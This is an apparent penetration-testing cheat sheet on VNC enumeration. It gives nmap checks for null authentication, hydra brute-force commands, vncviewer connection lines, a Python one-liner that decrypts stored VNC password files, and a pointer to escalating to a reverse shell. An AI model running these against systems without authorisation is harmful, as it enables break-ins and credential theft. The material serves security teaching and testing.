---
id: vnc-enum
title: VNC Enumeration
stage: enumeration
tags: [windows, linux, vnc]
summary: Check for null authentication or weak single-password VNC access — GUI access gives clipboard, file transfer, and full desktop without a traditional shell.
leads_to:
  - rev-shell
  - rdp-access
---

## Prerequisites

- Port 5900–5910 open

- VNC uses a single shared password (no username) — brute-force only needs a password list

- Security type `None (1)` connects without any password — check for this before brute-forcing

- Max effective password length is 8 characters (longer passwords are silently truncated by many servers) — always cap wordlist/hashcat mask at 8 chars

- Stored VNC password files use a hardcoded DES key — trivially decryptable

## Quick Win

> Check security types — type `None (1)` = connect immediately, no password.

```bash
nmap -p5900-5910 --script vnc-info $TARGET
# Security type 1 (None) = no authentication needed
```

## Null Authentication

> If security type is None — direct connect, no password prompt.

```bash
vncviewer $TARGET:5900
```

## Brute Force

> Single password (no username) — use a password-only wordlist.

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET
nmap -p5900 --script vnc-brute $TARGET
```

## Connect (with Password)

```bash
vncviewer $TARGET:5900              # prompts for password
vncviewer $TARGET:5901              # second display
vncviewer -passwd /tmp/passwd_file $TARGET:5900
```

## Crack Stored VNC Password File

> If you find `~/.vnc/passwd` post-compromise — the DES key is hardcoded and public.

```bash
python3 -c "
data = open('/path/to/passwd','rb').read()[:8]
key = bytes([23,82,107,6,35,78,88,7])
from Crypto.Cipher import DES
d = DES.new(key, DES.MODE_ECB)
print(d.decrypt(data))
"
# Or simpler:
# vncpwd /path/to/passwd
```

## Leads To

- Full GUI desktop access → browse files, open a terminal for a proper shell (`rev-shell`), launch PowerShell as admin, or reach other internal services

- GUI is slower than a shell for most tasks — use it to establish a proper reverse shell or find credentials, then move to CLI access
